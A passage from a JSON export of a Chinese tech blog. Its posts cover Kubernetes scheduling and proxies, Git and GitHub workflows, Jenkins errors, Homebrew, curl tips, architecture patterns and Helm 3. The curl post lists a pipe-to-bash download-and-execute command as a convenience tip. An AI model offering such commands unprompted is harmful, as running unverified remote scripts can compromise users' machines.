的格式为：\u0026lt;key\u0026gt;=\u0026lt;value\u0026gt;:\u0026lt;effect\u0026gt; 。\n其中 key、value(均可为空) 用于 tolerations 匹配，而 effect 有三个值：\n- PreferNoSchedule ，尽量不要调度 - NoSchedule ，不能调度 - NoExecute ，不能调度，同时驱逐已有 Pod 给 Node 增加一个 taint 1 kubectl taint nodes node1 key1=value1:NoSchedule 查看 Node 的 taint 1 kubectl describe nodes node1 给 Node 去掉 taint 1 kubectl taint nodes node1 key1:NoSchedule- Pod 容忍 taint 在 Pod 的 Spec 字段，新增 tolerations 描述容忍的 taint 。下面的例子，正好可以容忍上面打的 taint :\n1 2 3 4 5 6 7 8 spec: containers: - ... tolerations: - key: \u0026#34;key1\u0026#34; operator: \u0026#34;Equal\u0026#34; value: \u0026#34;value1\u0026#34; effect: \u0026#34;NoSchedule\u0026#34; 6. 参考 https://k8smeetup.github.io/docs/concepts/configuration/assign-pod-node/ https://kubernetes.io/docs/concepts/scheduling-eviction/taint-and-toleration/ ","description":"","id":305,"section":"post","tags":["博文","Kubernetes","调度","亲和性"],"title":"Kubernetes 调度器之亲和性","uri":"https://www.chenshaowen.com/blog/affinity-of-kubernetes-scheduler.html"},{"content":" 这也是一个给开源项目提交 PR 的完整 Git 流程。\n1. 本地配置 提交用户信息 1 2 git config --global user.name \u0026#34;username\u0026#34; git config --global user.email \u0026#34;user@email.com\u0026#34; GPG 配置 参考：GPG 验证提交\n2. 克隆代码 首先 fork 原仓库\n克隆 fork 的仓库代码\n1 git clone https://github.com/yourname/django-xss-cleaner.git 添加原仓库 1 git remote add upstream https://github.com/shaowenchen/django-xss-cleaner.git 查看本地配置的远程源 1 2 3 4 git remote -v origin xxx upstream xxx 3. 日常开发 拉取最新代码 1 git fetch upstream [可选]非 master 分支集成时操作 1 git checkout -b IntegratedBranch upstream/IntegratedBranch 非 master 分支集成，下面使用 IntegratedBranch 替换 master 即可。\n切换集成分支 1 git checkout master Rebase 更新到自己的仓库 1 git rebase upstream/master 新建一个开发分支 1 git checkout -b feature_1 master 开发 Coding\n提交代码 1 2 git add . git commit -s -m \u0026#34;message\u0026#34; 这里如果忘记加 -s，会缺少签名信息。可以通过 git commit --amend --no-edit -s 进行补救。\n提交 PR 选择将自己的 feature_1 分支合并到原仓库的 master 分支\n评论、修改，来回切磋，继续提交 1 2 git add . git commit -s -m \u0026#34;message\u0026#34; Rebase PR 中的 Commit 记录，仅留一条 1 git rebase -i HEAD~2 进入交互模式后，合并之前的两个 Commit 记录，保留第一个 pick，其他改成 f 或 s 。多条 Commit 时，将 2 修改为相应数值。\n强制推送 1 git push -f feature_1 由于远程已经有相关的 commit 记录，这里需要强制推送。\nPR 合并之后，删除开发分支 如果没有合并直接删除远端开发分支，会导致 PR 关闭。\n1 2 3 git checkout master git branch -D feature_1 git push origin :feature_1 ","description":"","id":306,"section":"post","tags":["博文","Git","研发"],"title":"一个完整的 Git 提交流程","uri":"https://www.chenshaowen.com/blog/a-complete-git-submission-process.html"},{"content":"1. Create a merge commit PR Commit 记录：\n1 2 commit c1 commit c2 集成分支 Commit 记录：\n1 2 3 commit PR #NUM commit c2 commit c1 Create a merge commit 会将 PR 中的全部 Commit 记录完整带到集成分支中，同时增加一条 PR Commit 信息。\n2. Squash and merge PR Commit 记录：\n1 2 commit s1 commit s2 集成分支 Commit 记录：\n1 commit PR #NUM Squash and merge 合并之后，集成分支只会增加一条 Commit 记录。观感不错，同时对具有多条 Commit 记录的 PR 友好，值得推荐。 PR 的标题和备注都可以在集成分支直接查看。\n3. Rebase and merge PR Commit 记录：\n1 2 commit r1 commit r2 集成分支 Commit 记录：\n1 2 commit r2 commit r1 Rebase and merge 会将 PR 中的全部 Commit 记录完整带到集成分支中。另外如果开发分支没有 Rebase ，继续提交 PR 记录会是这样：\n1 2 3 4 commit r1 commit r2 commit new1 commit new2 但已经合并的代码不会再次合并，只是影响 PR Commit 记录的观感。\n","description":"","id":307,"section":"post","tags":["博文","研发","GitHub","DevOps","CICD"],"title":"GitHub 三种合并代码方式的差别","uri":"https://www.chenshaowen.com/blog/the-difference-of-tree-ways-of-merging-code-in-github.html"},{"content":"1. 当我们值工单时，在值什么 一般人可能只提过工单，没值过工单。值过工单的人一般不会轻易提工单。\n工单就是客户花钱买产品，赠送的一服务，专门解决各种使用上的问题。在云基础设施的厂商很常见，IaaS、CDN、Domain、Container 等，不会用提个工单，用起来了不符合预期提个工单，符合预期想来点新鲜的提个工单。\n总能遇到各种各样的问题，好的方面是在研发之外，能够触达客户的场景，有利于优化和设计产品，还能扩展产品周边的领域知识；不好的方面是比较占用时间，如果很频繁或者这类问题只有很少人会解，可能会影响到研发。毕竟客户至上，紧急的工单比研发更加重要。\n2. 不同难度级别的问题 已知问题 已知问题，最好解。无论问题能否直接解决，总有一个回复。\n使用问题 使用问题通常是没有看透文档，也可以说文档不清晰、产品不人性，反正就是达不到预期。甚至还会怀疑是不是产品有 Bug ，有时也确实是。\n描述不清楚的问题 客户对领域不了解，在语言沟通上可能存在表意的偏差，主要表现在客户说了一堆你觉得莫名其妙的话。这个时候，就需要循序善诱，耐心引导客户，在什么场景下，做了什么，想要什么，最后发生了什么。需要一系列的对话，了解状况，再一一解答。\n我认为你这里有问题的问题 最难的是客户排查过的问题。客户能排查，但是没有解决问题，说明客户具备一定基础。这种情况的问题点常常又是客户认为没问题的地方。而这些地方，客户避而不提，反复提及他认为有问题的地方。\n3. 怎么处理工单 客户就是上帝 无论能不能帮到客户，都应该保持尊重、礼貌。\n尽可能了解背景 先圈出问题范围，是解决问题的关键。多问问客户进行了什么操作，了解清楚发生的背景。\n不要完全相信客户的话 如果完全相信客户的话，你也会出错。要想解决问题，就是要帮助客户打破固有的认知，点亮他心中的盲点。\n控制变量排查 控制变量法是世界上最好的排错方法。\n向其他人寻求帮助 世间纷扰，千头万绪的事情太多。各种系统的复杂性不是一个人能完全掌控的。如果花费了过多时间和精力，依然解决不了，那么向你的团队求助。可能其他人正好擅长，一句话就能给你指明方向。\n向客户争取时间 坦白从宽，向客户说明情况，争取更多时间。天才很少，有也不会来值工单，值了也很难遇到。不会或错误在所难免，唯有真诚，用心服务，才能打动客户。\n记录问题 好记性不如烂笔头，多记录多分析，你会受益颇多。如果其他人能够检索到问题的答案，就不会麻烦你了，这也减轻了值工单的负担。\n","description":"","id":308,"section":"post","tags":["博文","工单","研发","思考"],"title":"当我们值工单时，在值什么","uri":"https://www.chenshaowen.com/blog/how-to-process-work-order.html"},{"content":"1. 问题描述 配置 Webhook 自动触发执行 Jenkins 流水线时，报错：\n1 2 3 hudson.plugins.git.GitException: Command \u0026#34;git checkout -f 23b446ea\u0026#34; returned status code 128: stdout: stderr: fatal: reference is not a tree: 23b446ea 2. Git 如何管理版本 Git 是一个内容寻址文件系统。Git 维护着一棵 sha tree ，通过 sha 值可以回溯到任何一个历史节点。先看看提交记录：\n执行命令：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 git log commit e5562ec75fedf0bd66fe752e686db108cf20cf9b (HEAD -\u0026gt; fix_create_pipeline, origin/fix_create_pipeline) Date: Thu May 14 15:31:50 2020 +0800 fix create pipeline error commit 1bd660c370aca1113ae0b4fa2e814e9ea337e4d7 Date: Thu May 14 13:22:30 2020 +0800 fix proxy bug (#2070) commit 1464ca197d161b2ed693c7e9a053fcc97e0fdbaa (origin/master, origin/HEAD, fix_apiserver_devops) Merge: 1d48ca34 250dd4b0 Date: Wed May 13 17:24:31 2020 +0800 Merge pull request #2057 from fix bug of pvc api 可以发现，每次提交 git 都会生成一个 commitId ，也就是一个 sha 。commitId 后面紧跟的括号，说明了 commit 内容所属分支发生的变化。\n那么这些 (origin/master, origin/HEAD, fix_apiserver_devops) 又是什么含义呢？\n在 .git/refs/ 中，Git 存储着指向数据（分支）的提交对象的指针。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 tree .git/refs/ .git/refs/ ├── heads │ ├── feature_add_pipeline_api │ ├── fix_apiserver_devops │ ├── fix_create_devops │ ├── fix_create_pipeline │ ├── master │ └── release-2.1 ├── remotes │ ├── origin │ │ ├── HEAD │ │ ├── feature_add_pipeline_api │ │ ├── fix_create_devops │ │ ├── fix_create_pipeline │ │ ├── fix_devops │ │ └── master │ └── upstream │ ├── master │ └── release-2.1 └── tags 1 2 3 cat .git/refs/heads/feature_add_pipeline_api f0749ac442ef683a2de6ed3fdc8e3e3b44b71076 分支、标签在 Git 看来，就是指向 sha tree 某一个 sha 的指针。\n3. 原因分析 Jenkins 或相关 Git 插件出错的概率较小，当然也可以检查一下 Git 的版本。控制变量法，首先在 Jenkins 外部执行发生错误的命令。\n1 git checkout -f 23b446ea 在了解 Git 的工作原理之后，大概就能分析出原因：人使用的是 branchName、tagName ，而 Git 使用的是 sha 。reference not a tree 意味着，触发和执行两个阶段 sha tree 发生了变化。触发时，branchName 对应的 sha，在执行阶段不存在。下面是结合其他人遇到的情景进行的一些可能分析：\n分支名和标签名相同 分支和标签的差别在于，分支可以继续提交，而标签不能继续更改。两者同名时，会有一些怪异的行为，比如 branchName 消失等。\nrebase 导致 rebase 通常用于合并 upstream 的代码，也会用于将多个线性 commit 合并为一个。比如，下面的命令，将前 3 个版本的提交合并为 1 个：\n1 git rebase -i HEAD~3 这样会导致 commit 丢失，而丢失的 commit 可能正好触发了 Jenkins 的某个动作。\nPR 合并后，分支被删除 基于 特征开发，主干集成，分支发布 的思想，在持续集成的过程中，最佳实践的方式是当代码合并之后，随即删掉分支，Github 上打通了这个流程。\n特征分支触发 Jenkins 流水线之后，分支被删除，当执行到拉取代码时，也会报错。\nSubumodule 子仓库的 commit 记录发生了变化，在执行 git update 之类的操作时，也可能报错。\n非最新代码 使用了缓存的代码，在旧代码上找不到最新的 commit 。\n由于在 Jenkins 实践的过程中，使用方式和场景存在差异，除非是必现的错误，排查问题需要围绕问题的关键，控制变量一步一步筛查。\n4. 参考 https://github.com/kubernetes/kubernetes/issues/27462 ","description":"","id":309,"section":"post","tags":["博文","问题","Jenkins","DevOps","Git"],"title":"Jenkins 中 Git 操作 not a tree 分析","uri":"https://www.chenshaowen.com/blog/git-reference-not-a-tree-in-jenkins.html"},{"content":" 磨刀不误砍柴工，无论什么时候，花点时间在工具链上都是值得的。\n1. 自动补全 - kubectl OS X 安装命令：\n1 brew install bash-complete@2 不仅仅是 kubectl ，也给其他命令行提供自动补全的命令提示。\n在 .zshrc 中添加如下内容：\n1 2 # kubectl complete source \u0026lt;(kubectl completion zsh) 在输入 kubectl get pod 命令时，键入 Tab 会自动列举当前类型下的资源，如果没有任何资源，则列举目录文件。\n2. 环境切换和管理 - kubectx OS X 安装命令：\n1 brew install kubectx 提供两个命令行工具：\nkubectx ，切换不同集群 kubens ，切换不同 Namespaces 3. 将当前环境显示在命令行中 - kube-ps1 OS X 安装命令：\n1 brew install kube-ps1 在 .profile 中添加如下内容:\n1 2 3 # kube-ps1 source \u0026#34;/usr/local/opt/kube-ps1/share/kube-ps1.sh\u0026#34; PS1=\u0026#39;$(kube_ps1)\u0026#39;$PS1 但是由于通常 config 中配置的 context 名比较长，同时不易区分，需要修改下：\n1 sed -i\u0026#39;.s\u0026#39; -E \u0026#39;s/kubernetes-admin@cluster.local\u0026#39;/dev/ ~/.kube/config 将 kubernetes-admin@cluster.local 替换为 dev ，可以配合 本地快速切换不同 Kubernetes 环境 使用。\n4. 交互式命令 - kube-prompt kube-prompt 可以让用户省略每次都需要输入的 kubectl ，同时给出一些交互式的自动补全。kube-shell 也提供交互式的自动补全，但是很长时间没有更新了，使用 pip install kube-shell 进行安装，在服务器上可能用得上。\n安装命令：\n1 brew install c-bata/kube-prompt/kube-prompt 开始使用：\n1 kube-prompt 5. 参考 https://github.com/ahmetb/kubectx https://github.com/jonmosco/kube-ps1 https://github.com/c-bata/kube-prompt https://github.com/cloudnativelabs/kube-shell ","description":"","id":310,"section":"post","tags":["博文","Kubernetes","命令行","工具"],"title":"如何配置高效的 Kubernetes 命令行终端","uri":"https://www.chenshaowen.com/blog/how-to-configure-efficient-k8s-terminal.html"},{"content":" Homebrew 是 OS X 下的包管理工具，类似 CentOS 的 yum ，Ubuntu 的 apt-get 。在 OS X 命令行下，可以通过 brew 和 brew cask 命令安装应用。\n1. 安装 brew cask 1 brew install brew-cask-completion 2. brew 和 brew cask 区别 brew 与 brew cask 的区别在于偏向的应用类型。brew 更偏向于开发人员，主要安装命令行工具；brew cask 偏向日常用户，主要安装图形界面应用。\n在使用方法上，两者没有太大差别，基本上使用 brew cask 替换 brew 即可，详细请查看 help。\n3. brew 增删改查 安装 1 brew install \u0026lt;AppName\u0026gt; 卸载 1 brew uninstall \u0026lt;AppName\u0026gt; 更新 1 brew upgrade \u0026lt;AppName\u0026gt; 锁定，不升级 1 brew pin \u0026lt;AppName\u0026gt; 使用 unpin 可解锁\n查看 1 brew info \u0026lt;AppName\u0026gt; 4. brew 日常维护 列出安装的包 1 brew list 更新 Homebrew 1 brew update 更新全部包 1 brew upgrade 清理下载的包 1 brew cleanup 5. 禁用安装前 Homebrew 的更新 如果没有开代理或更换源，安装前的更新可能会很慢、甚至卡顿。下面的命令可以禁用安装前 Homebrew 的更新：\n1 export HOMEBREW_NO_AUTO_UPDATE=true 6. brew 更换源 1 2 3 4 5 6 7 8 9 cd \u0026#34;$(brew --repo)\u0026#34; git remote set-url origin https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/brew.git # git remote set-url origin https://github.com/Homebrew/brew.git cd \u0026#34;$(brew --repo)/Library/Taps/homebrew/homebrew-core\u0026#34; git remote set-url origin https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.git # git remote set-url origin https://github.com/Homebrew/homebrew-core brew update ","description":"","id":311,"section":"post","tags":["博文","Homebrew","命令行","工具"],"title":"Homebrew 使用","uri":"https://www.chenshaowen.com/blog/the-use-of-homebrew.html"},{"content":"1. Restful 请求 1 curl -X POST --data \u0026#39;keyword=value\u0026#39; http://domain.com/mypath/ -X 后面还可以是 DELETE PUT 等。\n2. 添加头部 1 curl -H \u0026#39;Content-Type:application/json\u0026#39; -H \u0026#39;Authorization: bearer MyToken\u0026#39; http://domain.com/mypath/ 3. Basic 验证访问 1 curl -u username:password http://domain.com/mypath/ 4. 下载并执行 curl -sSL http://domain.com/my.sh | bash 5. 忽略证书校验 1 curl -k https://domain.com/mypath/ 6. 设置代理 1 curl -x socks5://proxyuser:proxypassword@proxy.domain.com:8001 https://domain.com/mypath/ 7. 指定 Host 使用 IP 访问 1 curl -H \u0026#39;Host: www.domain.com\u0026#39; 1.2.3.4:8000 ","description":"","id":312,"section":"post","tags":["博文","Tips"],"title":"进阶的 curl 用法","uri":"https://www.chenshaowen.com/blog/the-advanced-usage-of-curl.html"},{"content":"最近用 Surface ，找出触控笔发现没电。换了一个 AAAA 电池，又发现笔尖触控失效。\n网上很多文档介绍的是卸载 Marvell AVASTAR Bluetooth ，重启生效。但这种方法对我无效，卸载 Precise Touch Device 之后反而生效。\n在设备管理里面找到下图选项，右键卸载，不用勾选删除，直接确定，然后重启生效。\n","description":"","id":313,"section":"post","tags":["博文","Tips","Surface"],"title":"Surface 触控笔失灵","uri":"https://www.chenshaowen.com/blog/surface-pen-lose-feeling.html"},{"content":"大家是否思考过如何设计大型企业级系统？在进行主要的软件开发之前，我们先得选择一个合适的架构。这个架构要给我们所需的功能和质量保证。因此，在将这些架构用于我们的设计之前，我们应该理解不同的架构体系。\n1. 什么是架构模式 根据 Wikipedia 解释，\n一个架构模式就是，在给定上下文条件下，解决软件架构中常见问题的一个通用、可复用的解决方案。架构模式类似于软件设计模式，但范围更广。\n在这篇文章中，我将简单介绍以下十种常见的架构模式的用法，及其优缺点。\n分层模式 客户端-服务器模式 主从模式 管道-过滤器模式 Broker 模式 点对点模式 事件总线模式 模型-视图-控制器模式 黑板模式 解释器模式 2. 分层模式 这种模式用于构建能被拆分为一组子任务的程序，每个子任务是一个特殊的抽象层。每层向更高一层提供服务。\n下面是通用信息系统中，最常见的 4 层：\n表示层（也称 UI 层） 应用层（也称服务层） 业务逻辑层（也称领域层） 数据层（也称持久化层） 用法：\n常见的桌面应用 电子商务 Web 应用 3. 客户端-服务器模式 这种模式由两部分组成，一个服务端和多个客户端。服务端组件将给多个客户端组件提供服务。客户端从服务端请求服务，服务端提供相关的服务给这些客户端。此外，服务端会持续监听客户端的请求。\n用法：\n在线应用，例如，电子邮件、共享文档和银行业务 4. 主从模式 这种模式由两部分组成，master 和 slaves 。master 组件分发任务给同等的 slave 组件，获取 slave 返回的结果之后，计算最终的结果。\n用法：\n在数据库复制中，master 数据库作为权威数据库，slave 数据库从其同步 在计算机系统中，连接到总线的外围设备（主、从驱动器） 5. 管道-过滤器模式 这种模式用于构建生产和处理数据流的系统。每个处理步骤都包含一个过滤器组件。需要被处理的数据才能够通过管道。这些管道能起到缓存或同步的作用。\n用法：\n编译器。一系列的过滤器完成词法分析、解析、语义分析和代码生成 生物信息学的工作流 6. Broker 模式 这种模式用于构建具有解耦组件的分布式系统。这些组件通过远程调用进行通信。 Broker 组件负责协调其他组件的通信。\n服务将其功能（服务地址和特征）发布到 Broker 。客户端向 Broker 请求一个服务时，Broker 查询注册表，将客户端的请求重定向到合适的服务地址。\n用法：\n消息中间件，例如，Apache ActiveMQ、Apache Kafka、RabbitMQ 和 JBoss Messaging 7. 点对点模式 在这种模式下，各个组件被称为对等端。对等端既可以作为客户端，向其他对等端请求服务，也可以作为服务端向其他对等端提供服务。对等端可以充当客户端或服务端，亦或同时都是，而且可以随时改变其角色。\n用法：\n文件共享网络，例如，Gnutella 和 G2 多媒体协议，例如，P2PTV 和 PDTP 8. 事件总线模式 这种模式主要处理事件，具有 4 个主要的组件，事件源，事件监听者，通道，事件总线。事件源将消息发布到事件总线上特定的通道。事件监听者订阅特定的通道。当有消息进入通道时，之前订阅过相关通道的监听者将会收到消息通知。\n用法：\nAndroid 开发 通知服务 9. 模型-视图-控制器模式 这种模式也被称为 MVC 模式，将一个交互式应用分为 3 个部分：\n模型 - 包含核心功能和数据 试图 - 向用户展示信息（可能定义了多个视图） 控制器 - 处理用户的输入 这样做是为了将程序内部的信息与展示给用户的信息，以用户能接受的方式分开。从而解耦组件，并且可以提高代码的复用率。\n用法：\n使用主流编程语言的互联网应用架构 Web 框架，例如，Django 和 Rails 10. 黑板模式 这种模式对于没有确定性解决方案的问题很有用。黑板模式主要由 3 部分组成：\n黑板 - 一个结构化的全局内存，包含来自解决方案空间的对象 知识源 - 具有自己表现形式的特殊模块 控制组件 - 选择、配置和执行模块 所有的组件都可以访问黑板。组件可以生成新的数据对象添加到黑板。组件可以在黑板上查看特定类型的数据，也可以使用现有知识源通过模式匹配查找数据。\n用途：\n语音识别 车辆识别和追踪 蛋白质结构识别 破译声呐信号 11. 解释器模式 这种模式用于设计一个解释专用语言编写的程序的组件。它主要指定如何计算每一行程序，也就是用特定语言编写的句子或表达式。其基本思想是语言的每个符号都有一个类。\n用法：\n数据库查询语言，例如 SQL 描述通信协议的语言 12. 架构模式的比较 下面的表格给出了每个架构模式的优缺点：\n13. 参考 https://towardsdatascience.com/10-common-software-architectural-patterns-in-a-nutshell-a0b47a1e9013 ","description":"","id":314,"section":"post","tags":["翻译","设计模式","架构"],"title":"一文读尽十种常见软件架构模式","uri":"https://www.chenshaowen.com/blog/10-common-software-architectural-patterns-in-a-nutshell.html"},{"content":" 通常，我们在主机上执行 export http_proxy/https_proxy 格式的命令，即可设置 Proxy 。但是主机上的设置在容器中并不会生效，下面提供了几种配置方法。\n1. 配置 Docker 的代理 - Node 级 在需要使用 Proxy 的节点进行配置，下面以 Docker 为例：\n创建配置文件 1 2 mkdir -p /etc/systemd/system/docker.service.d touch /etc/systemd/system/docker.service.d/https-proxy.conf 编辑配置文件，配置代理 [Service] Environment=\u0026#34;HTTP_PROXY=http://proxy.example.com:80/\u0026#34; Environment=\u0026#34;HTTPS_PROXY=https://proxy.example.com:443/\u0026#34; Environment=\u0026#34;NO_PROXY=localhost,127.0.0.1\u0026#34; 重启 Docker 1 2 systemctl daemon-reload systemctl restart docker 2. containers 中配置 Proxy - Container 级 在需要使用 Proxy 的容器中进行配置。\n1 2 3 4 5 6 7 8 9 10 11 12 13 spec: containers: - env: - name: HTTP_PROXY value: \u0026#34;http://proxy.example.com:80/\u0026#34; - name: HTTPS_PROXY value: \u0026#34;HTTPS_PROXY=https://proxy.example.com:443/\u0026#34; - name: http_proxy value: \u0026#34;http://proxy.example.com:80/\u0026#34; - name: https_proxy value: \u0026#34;HTTPS_PROXY=https://proxy.example.com:443/\u0026#34; - name: no_proxy value: \u0026#34;localhost,127.0.0.1\u0026#34; 3. 参考 https://docs.docker.com/config/daemon/systemd/ ","description":"","id":315,"section":"post","tags":["博文","Docker","Kubernetes","代理"],"title":"给 Kubernetes 配置 Proxy","uri":"https://www.chenshaowen.com/blog/how-to-set-proxy-for-kubernetes.html"},{"content":"1. 关于 Label 在前面的文档 如何使用 python-gitlab 自动创建 GitLab Label 中，我已经阐述了 Label 可以用于简单的项目管理。\n一个团队，通常不止一个代码仓库，为了减轻沟通和学习成本，除了使用一致的工具链，还应该达成一定的基础共识。这些基础共识，促使大家达成最佳的实践方式。同一个大项目下，所有子项目使用同一套 Label 就是其中之一。\n2. 如何复制其他项目的 Label 在开源社区中，会有一些在领域非常有影响力的项目。参与并跟随社区的实践，是一个不错的选择。我们可以在 settings/tokens 页面，创建一个 Token 用于同步其他项目的标签。这里对 Token 的权限没有要求，不必勾选任何选项。\n安装 PyGithub 1 pip install PyGithub==1.50 执行下面这段脚本，替换相关变量 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # -*- coding: utf-8 -*- from github import Github g = Github(\u0026#34;xxxTokenxxx\u0026#34;) u_repo = g.get_repo(\u0026#34;kubernetes/kubernetes\u0026#34;) my_repo = g.get_repo(\u0026#34;shaowenchen/test\u0026#34;) labels = u_repo.get_labels() for label in labels: try: my_repo.create_label(label.name, label.color) except Exception as e: print(e) 3. 参考 https://github.com/PyGithub/PyGithub/ https://pygithub.readthedocs.io/ 打造一致性的团队 ","description":"","id":316,"section":"post","tags":["博文","GitHub","流程","研发"],"title":"使用 PyGithub 自动创建 Label","uri":"https://www.chenshaowen.com/blog/how-to-create-labels-by-pygithub.html"},{"content":"1. 人越来越重要 为什么互联网行业的估值显著高于制造业？同样优秀的行业公司，腾讯的 PE 高达 30+，而格力的 PE 只有 10+。\n互联网行业的特点是轻资产，没有昂贵的复杂设备，不需要大的生产厂房。除非准备收藏，设备的价值每年都有减损，还少不了维护费用，不定期还得更换。相较于制造公司，软件公司的主要设备是一部手机或电脑，成本极低。\n软件公司的员工，只需要一台能联网的电脑就可以不断地产出。随着网络覆盖越来越广、传输速率越来越快、消费电子越来越便宜，软件公司最重要的生产因素变成了人，人的劳务工资占据了绝大部分的公司成本。不仅仅是互联网行业，其他行业也有类似的趋势，用机器人替代手工，用软件服务替代人工等。一方面减少人力成本，另一方面设备同质化后，又更加重视人。看似矛盾，实则对员工提出了更高的要求。类似 DevOps、全栈等概念，强调的是复合型的员工技能。\n人越来越重要。因为人是不可复制的，是唯一具有差异性的。这种差异性最终决定了能否快速响应市场变化，决定了产品的优劣，决定了能否在竞争中取得胜利。\n2. 产品是团队能力的输出 产品是解决方案的交付承载物，其优劣取决于团队对核心问题的理解。\n近年 SaaS 行业创业比较多。他们利用在行业的人脉积累，对行业问题的理解，将解决方案转化为 SaaS ，对外提供服务。SaaS 成本不高，只需要拿下几个客户比在公司上班挣的钱还多。不是每个人都有这样的积累和机缘，能够拿下客户。但这个逻辑是对的。\n在人多一点的公司，无非就是分工更细了。有人负责产品挣钱，有人负责产品研发。在公司发展的不同阶段，会有不同的侧重点。为了生存下去，会更侧重挣钱；为了长远战略，会更重视研发。这就对团队的适应性提出了更高要求。\n团队对问题理解越透彻，产品的生存能力越强。如果只是为了更好用而去设计，产品只能算是一个好看的花瓶。只有不断深入领域，才能驱动产品不断向好的方面迭代。\n产品是团队能力的输出。团队不仅要解决领域问题，还要适应市场变化。团队能力的上限，决定了产品的上限。\n3. ToB 最终还是 ToC 现在大型 ToC 的 IT 团队除了支持公司客户，还要支持客户的客户。\n一鱼多吃的好处很多，除了让团队捋顺业务逻辑、加深理解需求，还能够在行业形成影响力，顺带挣回了钱。如果能参与一下开源，多几次社区的分享，对团队会更有激励，也更好招聘新人。\n大型 ToC 转 ToB ，是有产品优势的。ToC 具备成本足够低的实验场景，让团队可以迭代打磨产品。在小公司成长为大公司的过程中，伴随业务发展，解决方案是不断演化的。而大型 ToC 公司正好经历过完整的周期，具备对外输出能力，提供解决方案的基础。\nToB 的利润来源于 ToC ，只有为客户的客户创造了价值，ToB 才能与 ToC 分享成功。而没有 ToC 基础的 ToB ，只能靠行业的深耕，对客户的服务取胜。\n","description":"","id":317,"section":"post","tags":["博文","思考","软件","产品","团队"],"title":"软件产品是团队能力的输出","uri":"https://www.chenshaowen.com/blog/the-product-is-the-output-of-teams-ability.html"},{"content":" Helm 3 终于发布了。我们可以告别 Tiller 了，但 Helm 3 的改变不仅于此。让我们继续探讨其他的变化。\n1. 告别 Tiller Helm 3 移除了 Tiller ，是个不错的决定。但是要理解为什么不错，我们还需要了解一下 Tiller 产生的背景。Tiller 是 Helm 的服务端组件（运行在 Kubernetes 集群上），主要目的是为了让多个不同的操作者能够在同一个集群上操作。开发 Helm 2 时，由于 Kubernetes 没有基于角色的访问控制（RBAC），Helm 不得不自己控制谁、在哪里能够安装应用。直到 Kubernetes 1.6 中开启了 RBAC ，这件事就变得简单了。Helm 也不必与 Kubernetes 做重复的事情，因此 Helm 3 彻底移除了 Tiller 。\nTiller 作为维护 Helm 应用信息和状态的核心。Helm 3 直接从 Kubernetes API Server 就可以获取到相同的信息，并且在客户端呈现 Charts 。对于 Kubernetes 来说，这种方式更加简单而原生。\n移除 Tiller 之后，Helm 的安全模型也变得简单（使用 RBAC 来控制生产环境 Tiller 的权限非常不易于管理）。Helm 3 使用 kubeconfig 鉴权。集群管理员针对应用，可以设置任何所需级别的权限控制，而其他功能保持不变。\n2. 好吧，除了 Tiller ，还有什么改变？ 正如前面提到的，移除 Tiller 是一件大事，但不是唯一的一件。让我们看看其他的。\n2.1 三路合并补丁策略 Helm 2 使用的是两路合并补丁策略。也就是，当你想执行任何 helm 操作时，比较最新的 chart 包与期望的 chart 包配置。这两个包之间的不同，决定了应该调整 Kubernetes 中的哪些资源。听起来不错，对吗？但是没有考虑手动修改应用的情况（例如，使用 kubectl edit）。这将导致应用无法回滚到之前的状态，因为 Helm 2 将最新的 chart 包当做最新的状态，而最新的 chart 包里面没有改变（我们只是更新了应用在集群的状态），Helm 2 忽略了这一变化的回滚。\n三路策略合并补丁可以解决这个问题。Helm 3 是如何做的呢？它只是多考虑了应用的线上状态（使用三路替代两路，旧的配置，线上状态，新的配置）。例如，假设你部署了一个应用：\n1 helm install very_important_app ./very_important_app 这个应用的副本数量设置为 3 。现在，如果有人不小心执行了 kubectl edit 或：\n1 kubectl scale -replicas=0 deployment/very_important_app 然后，团队中的某个人发现 very_important_app 莫名其妙宕机了，尝试执行命令：\n1 helm rollback very_important_app 在 Helm 2 中，这个操作将比较旧的配置与新的配置，然后生成一个更新补丁。由于，误操作的人仅修改了应用的线上状态（旧的配置并未更新）。Helm 在回滚时，什么事情也不会做。因为旧的配置与新的配置没有差别（都是 3 个副本）。然后，Helm 不执行回滚，副本数继续保持为 0 。此时，你有些慌了\u0026hellip;\n另一方面，在 Helm 3 中，将使用旧的配置，线上状态，新的配置生成更新补丁。Helm 发现旧的配置副本数是 3 ，线上状态是 0 ，判断出新的配置期望改回 3 ，因此生成一个更新补丁回滚。此时，你不那么慌了\u0026hellip;\n使用 Helm 3 进行升级时，也会发生类似的过程。例如，某个基于控制器的应用（或类似服务网格）注入任何内容到 Helm 部署的 Kubernetes 对象中。在 Helm 2 中进行升级时，注入的内容将被移除。在 Helm 3 中，由于考虑到了在线状态，注入的内容将会被保留。假设我们想要在集群上安装 Istio 。Istio 将 Sidecar 注入到每个部署中。使用 Helm 进行部署：\n1 2 3 containers: - name: server image: my_app:2.0.0 安装 Istio 之后，你的容器定义看起来像这样：\n1 2 3 4 5 containers: - name: server image: my_app:2.0.0 - name: istio-sidecar image: istio-sidecar-proxy:1.0.0 如果使用 Helm 2 进行升级，你将得到如下结果：\n1 2 3 containers: - name: server image: my_app:2.1.0 Istio Sidecar 由于不在配置中，将会被移除。然而，Helm 3 将基于旧的配置、在线状态、新的配置生成一个更新补丁。Helm 3 会将 image 更新为 2.1.0 ，另外在线状态还包含一些额外的配置。最终，使用 Helm 3 升级将得到你想要的：\n1 2 3 4 5 containers: - name: server image: my_app:2.1.0 - name: istio-sidecar image: istio-sidecar-proxy:1.0.0 三路策略合并补丁更新，让 Helm 升级更加可控和安全。\n2.2 Secrets 作为默认存储器 Helm 2 使用 ConfigMaps 存储应用的信息。在 Helm 3 中，改为 Secrets （secret 类型为 helm.sh/release ）作为默认存储器。这带来了一些优势，并极大简化了 Helm 的功能。Helm 2 必须要经过一系列操作才能获取（和应用）配置。这些配置加密、打包存储在某一个 keys 或 ConfigMap 中。Helm 3 直接将配置存储在 Secret ，无需执行复杂操作，只需要提取、解码、使用即可。另一个优点是，应用名称不必集群唯一。包含应用信息的 Secrets 存储在应用安装的 Namespace 中。因此，在不同的 Namespace 中，应用可以具有相同的名字。\n2.3 JSON Schema 验证 Chart 信息 可以使用 JSON Schema 强制对 chart 中的 values 值进行校验。基于此功能，你能够确保使用者提供的 values 值符合 chart 包的要求。这给 OPS 与 DEV 创造了更多合作机会（OPS 团队能给 DEVs 更大自由度），当用户 values 